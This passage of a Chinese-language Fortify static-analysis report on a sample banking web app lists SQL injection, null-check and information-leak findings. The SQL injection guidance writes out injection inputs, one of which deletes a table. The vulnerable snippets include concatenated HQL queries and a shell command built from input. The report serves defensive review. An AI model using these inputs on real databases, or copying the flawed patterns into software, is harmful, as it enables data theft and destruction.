                                <Value>如果函数返回错误代码或其他任何有关运行成功或失败的证据，请务必检查错误状况，即便没有任何明显迹象表明会发生这种错误。除了避免安全错误，许多乍看上去难以理解的 bug 最后都会归结为错误的方法调用，并带有 unchecked return value。

在您的应用程序中创建一种便于使用的、标准的处理故障方法。如果错误处理过程简单直接，往往不容易被程序员忽略。一种标准化的错误处理方法是，将围绕检查和处理错误状况的常用函数写入封装器，而无需程序员的其他干预。实施并采用封装器后，就可以禁止使用未封装的函数，并利用自定义规则加以执行。

例 3：以下代码对 getParameter() 执行了一个封装方法，用以检查 getParameter() 的返回值是否为 null，并且在所需参数没有定义时是否使用了默认值。


String safeGetParameter (HttpRequest request, String name)
{
    String value = request.getParameter(name);
    if (value == null) {
        return getDefaultValue(name)
    }
    return value;
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 为了对此类问题进行辩解，某些程序员这样解释道：“这是绝对不可能会发生的，因为...”，对此我们必须加以提防。如今，程序员能够利用自己的开发环境来拓展对系统运行方式的直观认识。如果软件最终运行在不同种类或版本的操作系统上、采用不同的硬件配置或运行时环境，那么原有的直观认识可能就不再适用了。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>16</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="FD2608FED12EA67FA377D565BEFF7756" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>AccountDetails.jsp 中的 _jspService() 方法可能会间接引用第 24 行上的空指针，因为它不对 getAttribute() 的返回值进行检查，而此返回值可能为 null。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountDetails.jsp</FileName>
                                <FilePath>pages/content/AccountDetails.jsp</FilePath>
                                <LineStart>24</LineStart>
                                <Snippet>
                                &lt;%
                                    int size = ((java.util.List) request.getAttribute("transactions")).size();
                                    request.setAttribute("size", new Integer(size));
                                    DateFormat format = DateFormat.getDateInstance(DateFormat.SHORT);</Snippet>
                                <TargetFunction>getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FC9594DCB564177BBD1FD15EB3B2C869" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>AccountDetails.jsp 中的 _jspService() 方法可能会间接引用第 43 行上的空指针，因为它不对 getAttribute() 的返回值进行检查，而此返回值可能为 null。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountDetails.jsp</FileName>
                                <FilePath>pages/content/AccountDetails.jsp</FilePath>
                                <LineStart>42</LineStart>
                                <Snippet>                                                &lt;c:set var="amount" scope="request" value="${transaction.amount}"/&gt;
                                                &lt;%
                                                    Double amount = (Double)request.getAttribute("amount");
                                                    request.setAttribute("amount", numFormat.format(amount.doubleValue()));
                                                %&gt;</Snippet>
                                <TargetFunction>amount = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="91FA96F1ED7C9A964C4F8E76F3D079FB" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>AccountSummary.jsp 中的 _jspService() 方法可能会间接引用第 34 行上的空指针，因为它不对 getAttribute() 的返回值进行检查，而此返回值可能为 null。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountSummary.jsp</FileName>
                                <FilePath>pages/content/AccountSummary.jsp</FilePath>
                                <LineStart>33</LineStart>
                                <Snippet>                                &lt;c:set var="balance" scope="request" value="${account.balance}"/&gt;
                                &lt;%
                                    Double balance = (Double)request.getAttribute("balance");
                                    request.setAttribute("balance", numFormat.format(balance.doubleValue()));
                                %&gt;</Snippet>
                                <TargetFunction>balance = getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8BC4F371416F6B0527F6C732B926351F" ruleID="4280F38B-9FDB-454E-B495-89CF45CD51B7">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>AccountSummary.jsp 中的 _jspService() 方法可能会间接引用第 20 行上的空指针，因为它不对 getAttribute() 的返回值进行检查，而此返回值可能为 null。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountSummary.jsp</FileName>
                                <FilePath>pages/content/AccountSummary.jsp</FilePath>
                                <LineStart>20</LineStart>
                                <Snippet>				&lt;/tr&gt;
                &lt;%
                    int size = ((java.util.List)request.getAttribute("accounts")).size();
                    request.setAttribute("size", new Integer(size));
                %&gt;</Snippet>
                                <TargetFunction>getAttribute(...) : ServletRequest.getAttribute may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B06317037B07BFC689DE64BCFFEECFE7" ruleID="C3693353-E32E-4B40-964A-94186E0D63B3">
                            <Category>Missing Check against Null</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>hidden_AdminControl.jsp 中的 _jspService() 方法可能会间接引用第 90 行上的空指针，因为它不对 getProperty() 的返回值进行检查，而此返回值可能为 null。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>90</LineStart>
                                <Snippet>
			 String runtimeCommand = "";
			 if (System.getProperty("os.name").startsWith("Windows"))
				runtimeCommand = "cmd.exe /C " + command;
			 else</Snippet>
                                <TargetFunction>getProperty(?) : System.getProperty may return NULL()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>SQL Injection: Hibernate</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>在 AccountService.java 的第 318 行，IsAccountExist() 方法使用 Hibernate 来执行通过来自不可信来源的输入构建的动态 SQL 指令。攻击者可以修改指令含义或执行任意的 SQL 命令。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>SQL injection 错误在以下情况下发生：

1. 数据从一个不可信赖的数据源进入程序。



2. 该数据用于动态地构造一个 HQL 查询。



示例 1：以下代码动态地构造并执行一个 HQL 查询，用于搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "FROM items WHERE owner = '"
				+ userName + "' AND itemname = '"
				+ itemName + "'";
	List items = sess.createQuery(query).list();
	...


查询计划执行以下代码：


	SELECT * FROM items
	WHERE owner = &lt;userName&gt;
	AND itemname = &lt;itemName&gt;;


但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name' OR 'a'='a”，那么查询就会变成：


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name' OR 'a'='a';


附加条件 OR 'a'='a' 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：


	SELECT * FROM items;


通常，查询必须仅返回已通过身份验证的用户所拥有的条目，而通过以这种方式简化查询，攻击者就可以规避这一要求。现在，查询会返回存储在 items 表中的所有条目，而不论其指定所有者是谁。

示例 2：此示例说明了将不同的恶意值传递给Example 1.中构造和执行的查询所带来的影响。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name'; DELETE FROM items; --”，则该查询就会变为以下两个查询：


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	--'


众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。

注意末尾的一对连字符 (--)；这在大多数数据库服务器上都表示该语句剩余部分将视为注释，不会加以执行 [4]。在这种情况下，可通过注释字符删除修改后的查询遗留的末尾单引号。而在不允许通过这种方式使用注释的数据库上，攻击者通常仍可使用类似于Example 1.中所用的技巧进行攻击。如果攻击者输入字符串“name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a”，将创建以下三个有效语句：


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	SELECT * FROM items WHERE 'a'='a';


避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：

    — 把没有被黑名单引用的值作为目标
    — 寻找方法以绕过对某一转义序列元字符的需要
    — 使用存储过程来隐藏注入的元字符

手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。

防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。再次重申，存储过程可以阻止某些类型的盗取行为，但是它们并不能保护您的应用程序免受 SQL Injection 攻击。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。

前面的例子可以改成使用参数化 SQL 指令的攻击方式（替代用户输入连续的字符串），如下所示：


...
String userName = ctx.getAuthenticatedUserName();
String itemName = request.getParameter("itemName");
String query =
        "FROM items WHERE itemname=? AND owner=?";
Query stmt = sess.createQuery(query);
stmt.setString(0, itemName);
stmt.setString(1, userName);
List items = stmt.list();
...


更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。

如果输入必须直接包含在指令中，就应当使用绑定参数。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 使用参数化 SQL 指令的一个常见错误是使用由用户控制的字符串来构造 SQL 指令。这显然背离了使用参数化 SQL 指令的初衷。如果不能确定用来构造指令的字符串是否由应用程序控制，请不要因为这些字符串不会直接用作 SQL 指令就假定它们是安全的。务必彻底地检查 SQL 指令中使用的所有由用户控制的字符串，确保它们不会修改查询的含意。

2. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>16</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5190A90E68580EA5CC5892A09CE1CB3D" ruleID="7707E776-D290-498C-9797-153C4D1F2704">
                            <Category>SQL Injection: Hibernate</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 LocationService.java 的第 69 行，findAtmByZip() 方法使用 Hibernate 来执行通过来自不可信来源的输入构建的动态 SQL 指令。攻击者可以修改指令含义或执行任意的 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>69</LineStart>
                                <Snippet>            session = ConnectionFactory.getInstance().getSession();
            String queryStr = "from Location where atm = 'Yes' and zip ='" + zip + "'";
            Query query = session.createQuery(queryStr);
            locations = query.list();
        }</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.createQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>FindLocations.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/FindLocations.java</FilePath>
                                <LineStart>91</LineStart>
                                <Snippet>	}

	public void setZip(String zip)
	{
		this.zip = zip;</Snippet>
                                <TargetFunction>setZip(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F40AE9EDC4F5927C6DBD694EEBA01E08" ruleID="6577EF16-48D1-4C99-81DE-C883ABB82E25">
                            <Category>SQL Injection: Hibernate</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 MessageService.java 的第 70 行，getMessage() 方法调用可能使用不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Low</Friority>                            <Primary>

                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>70</LineStart>
                                <Snippet>
        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();</Snippet>
                                <TargetFunction>createQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E1563936A659A6B49EA3F2CC8975CA5C" ruleID="7707E776-D290-498C-9797-153C4D1F2704">
                            <Category>SQL Injection: Hibernate</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 AccountService.java 的第 318 行，IsAccountExist() 方法使用 Hibernate 来执行通过来自不可信来源的输入构建的动态 SQL 指令。攻击者可以修改指令含义或执行任意的 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>318</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            List ret = session.find((new StringBuilder()).append("select account.acctno from Account account where acctno='").append(acctno).append("'").toString());
            if(ret.size() &lt;= 0)
            {</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.find()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>141</LineStart>
                                <Snippet>    @Path("{acctno}")
    @Produces("application/xml")
    public String DeleteAccount(@PathParam("acctno") String acctno) {
        try {
            if(!AccountService.IsAccountExist(acctno)) {</Snippet>
                                <TargetFunction>DeleteAccount(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2D3F043EBA74B7A6A68094B5FE2E4704" ruleID="7707E776-D290-498C-9797-153C4D1F2704">
                            <Category>SQL Injection: Hibernate</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 MessageService.java 的第 137 行，getMessage() 方法使用 Hibernate 来执行通过来自不可信来源的输入构建的动态 SQL 指令。攻击者可以修改指令含义或执行任意的 SQL 命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>137</LineStart>
                                <Snippet>
        String queryStr = "from Message message where message.username ='" + username + "' order by message.date desc";
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.createQuery()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Messages.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/Messages.java</FilePath>
                                <LineStart>20</LineStart>
                                <Snippet>    public String execute() throws Exception
    {
        messages = MessageService.getMessage(ServletActionContext.getRequest().getRemoteUser());
        super.execute();
        return SUCCESS;</Snippet>
                                <TargetFunction>javax.servlet.http.HttpServletRequest.getRemoteUser()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="692215F831437E8C6F5CB6EB20E99B53" ruleID="6577EF16-48D1-4C99-81DE-C883ABB82E25">
                            <Category>SQL Injection: Hibernate</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>在 ProfileService.java 的第 152 行，getFullname() 方法调用可能使用不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ProfileService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/ProfileService.java</FilePath>
                                <LineStart>152</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            List ret = session.find("select profile.firstname, profile.lastname from Profile profile where username='"+username+"'");
            if (ret.size() &gt; 0)
            {</Snippet>
                                <TargetFunction>find()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>System Information Leak: Internal</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>DatabaseController.java 中的 contextDestroyed() 函数可能通过调用第 44 行的 println() 来揭示系统数据或调试信息。由 println() 揭示的信息有助于攻击者制定攻击计划。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>通过打印或日志功能将系统数据或调试信息发送到本地文件、控制台或屏幕时，就会发生内部信息泄露。



示例 1：以下代码会将一个异常写入标准错误流：


try {
    ...
} catch (Exception e) {
    e.printStackTrace();
}


根据这一系统配置，该信息可能会转储到控制台、写入日志文件或公开给用户。在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一则数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在Example 1 中，泄露的信息可能会暗示有关操作系统类型、系统上安装了哪些应用程序以及管理员在配置程序时采取了哪些保护措施的信息。

在移动世界，信息泄露也让人担忧。

示例 2：以下代码记录了在 Android 平台上捕获的异常的堆栈跟踪。

...
try {
  ...
} catch (Exception e) {
    Log.e(TAG, Log.getStackTraceString(e));
}
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。

即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 不要依赖于封装器脚本、组织内部的 IT 策略或是思维敏捷的系统管理员来避免 System Information Leak 漏洞。编写安全的软件才是关键。

2. 这类漏洞并不适用于所有类型的程序。例如，如果您在一个客户机上执行应用程序，而攻击者已经获取了该客户机上的系统信息，或者如果您仅把系统信息打印到一个可信赖的日志文件中，就可以使用 AuditGuide 来过滤这一类别。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>16</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8D044A80083F2710B84B6ED8B8B22EBD" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DatabaseController.java 中的 contextDestroyed() 函数可能通过调用第 61 行的 println() 来揭示系统数据或调试信息。由 println() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>61</LineStart>
                                <Snippet>		}
		catch(SQLException e) {
			System.err.println("Cannot shutdown the builtin database:" + e.getMessage());
		}
        finally{</Snippet>
                                <TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>61</LineStart>
                                <Snippet>		}
		catch(SQLException e) {
			System.err.println("Cannot shutdown the builtin database:" + e.getMessage());
		}
        finally{</Snippet>
                                <TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7096BFD73D6055A19DC7013292887252" ruleID="71EC6406-EE66-42A2-AE4B-C0A79070D6E2">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ConnectionFactory.java 中的 ConnectionFactory() 函数可能通过调用第 67 行的 throwing() 来揭示系统数据或调试信息。由 throwing() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>67</LineStart>
                                <Snippet>			 *
			 */
            log.throwing(ConnectionFactory.class.getName(), "ConnectionFactory", e);
			throw new RuntimeException(e);
		}</Snippet>
                                <TargetFunction>java.util.logging.Logger.throwing()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>67</LineStart>
                                <Snippet>			 *
			 */
            log.throwing(ConnectionFactory.class.getName(), "ConnectionFactory", e);
			throw new RuntimeException(e);
		}</Snippet>
                                <TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7096BFD73D6055A19DC7013292887253" ruleID="71EC6406-EE66-42A2-AE4B-C0A79070D6E2">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ConnectionFactory.java 中的 ConnectionFactory() 函数可能通过调用第 77 行的 throwing() 来揭示系统数据或调试信息。由 throwing() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>77</LineStart>
                                <Snippet>			 *
			 */
            log.throwing(ConnectionFactory.class.getName(), "ConnectionFactory", e);
			throw new RuntimeException(e);
		}</Snippet>
                                <TargetFunction>java.util.logging.Logger.throwing()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>77</LineStart>
                                <Snippet>			 *
			 */
            log.throwing(ConnectionFactory.class.getName(), "ConnectionFactory", e);
			throw new RuntimeException(e);
		}</Snippet>
                                <TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8D044A80083F2710B84B6ED8B8B22EBE" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DatabaseController.java 中的 contextDestroyed() 函数可能通过调用第 44 行的 println() 来揭示系统数据或调试信息。由 println() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>etc/tomcat5.5-support/src/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>44</LineStart>
                                <Snippet>		}
		catch(SQLException e) {
			System.err.println("Cannot shutdown the builtin database:" + e.getMessage());
		}
	}</Snippet>
                                <TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>DatabaseController.java</FileName>
                                <FilePath>etc/tomcat5.5-support/src/com/fortify/samples/riches/database/DatabaseController.java</FilePath>
                                <LineStart>44</LineStart>
                                <Snippet>		}
		catch(SQLException e) {
			System.err.println("Cannot shutdown the builtin database:" + e.getMessage());
		}
	}</Snippet>
                                <TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9EBDCE1203CADB2976C1A992DD759647" ruleID="71EC6406-EE66-42A2-AE4B-C0A79070D6E2">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ConnectionFactory.java 中的 getSession() 函数可能通过调用第 129 行的 throwing() 来揭示系统数据或调试信息。由 throwing() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>129</LineStart>
                                <Snippet>			 *
			 */
            log.throwing(ConnectionFactory.class.getName(), "getSession", e);
			throw new RuntimeException(e);
		}</Snippet>
                                <TargetFunction>java.util.logging.Logger.throwing()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>129</LineStart>
                                <Snippet>			 *
			 */
            log.throwing(ConnectionFactory.class.getName(), "getSession", e);
			throw new RuntimeException(e);
		}</Snippet>
                                <TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="11">
                        <groupTitle>System Information Leak: HTML Comment in JSP</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>login.jsp 中第 207 行的 HTML 注释所包含的任何信息都有可能帮助攻击者了解系统并制定相应的攻击方案。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>HTML 注释会给攻击者提供关于动态生成的 web 页面的信息源。

例 1：


&lt;!-- TBD: this needs a security audit --&gt;
